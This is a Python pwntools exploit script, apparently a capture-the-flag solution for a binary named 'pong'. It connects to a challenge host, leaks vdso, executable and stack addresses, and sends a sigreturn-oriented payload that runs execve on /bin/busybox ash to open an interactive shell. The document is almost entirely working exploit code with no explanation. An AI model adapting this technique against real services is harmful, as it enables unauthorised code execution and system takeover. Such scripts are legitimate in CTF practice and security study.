#!/usr/bin/env python
from pwn import *
import psutil

context.update(arch="amd64",os="linux")
context.binary = exe = ELF("./pong", checksec=False)

def get_pid_by_name(process_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == process_name:
            return process.info['pid']
    return None

if args.REMOTE:
    p = remote("flu.xxx", 10060)
else:
    p = remote("localhost",1440)

pause() # to give it some time 

# attach to process in docker
if args.GDB:
    gdb.attach(target=get_pid_by_name('pong'), exe='./pong', gdbscript='''
        source /home/moody/.gdbinit-gef-docker.py
        b *loop+52
    ''')

sleep(1)
p.sendline(b"A"*16)
leak = p.recv()

if args.REMOTE:
    vdso_base = u64(leak[120:128].ljust(8, b"\x00"))
    exe_leak = u64(leak[184:192].ljust(8, b"\x00"))
    stack_leak = u64(leak[360:368].ljust(8, b"\x00"))
else:
    vdso_base = u64(leak[128:136].ljust(8, b"\x00"))
    exe_leak = u64(leak[208:216].ljust(8, b"\x00"))
    stack_leak = u64(leak[384:392].ljust(8, b"\x00"))

exe_base = exe_leak - 0x40
stack_leak = stack_leak - 0x3e9

log.success(f"{hex(vdso_base)=}")
log.success(f"{hex(exe_base)=}")
log.success(f"{hex(stack_leak)=}")

# for i in range(0, len(leak), 8):
#     leaks = u64(leak[i:i+8].ljust(8, b"\x00"))
#     log.info(f"{i}: {hex(leaks)}")

inc_rax = exe_base + 0x103c
syscall = exe_base + 0x1036

binsh_addr = stack_leak + 376
arg1_addr = binsh_addr + 16 # for binsh string length

frame = SigreturnFrame()
frame.rax = 0x3b  # execve
frame.rdi = binsh_addr # /bin/busybox
frame.rsi = arg1_addr + 8 # params[]
frame.rdx = 0
frame.rsp = stack_leak + 0x200 - 9
frame.rip = syscall

# call execve("/bin/busybox", ["ash"],0)

payload = p64(inc_rax)*0xf
payload += p64(syscall)
payload += bytes(frame)
payload += b'/bin/busybox\x00'.ljust(16, b'\x00')
payload += b'ash\x00'.ljust(8,b'\x00')
payload += p64(arg1_addr) # params
payload += p64(0)

p.sendline(b"A"*8)
p.recv()
p.sendline(b"B"*4)
p.recv()
sleep(1)
p.sendline(payload)

p.interactive()